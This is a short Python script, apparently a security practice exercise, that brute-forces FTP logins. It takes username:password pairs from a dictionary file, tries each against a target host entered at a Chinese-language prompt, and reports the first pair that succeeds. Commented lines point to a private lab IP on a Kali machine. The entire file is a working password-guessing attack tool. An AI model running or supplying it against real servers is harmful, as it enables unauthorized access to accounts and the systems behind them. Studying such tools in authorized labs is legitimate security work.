# coding=utf-8
# python3
# by 此意系

import ftplib
def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + username + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + username + '/' + password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
    print('\n[-] Could not brubrute force FTP credentials.')
    return (None, None)

if __name__ == '__main__':
    host = str(input("请输入目标IP:"))
    passwdFile = str(input("密码字典绝对路径:"))
    bruteLogin(host, passwdFile)
# host = '192.168.1.16' #目标IP
# passwdFile = r'/home/kali/桌面/a.txt' #密码字典
# bruteLogin(host, passwdFile)
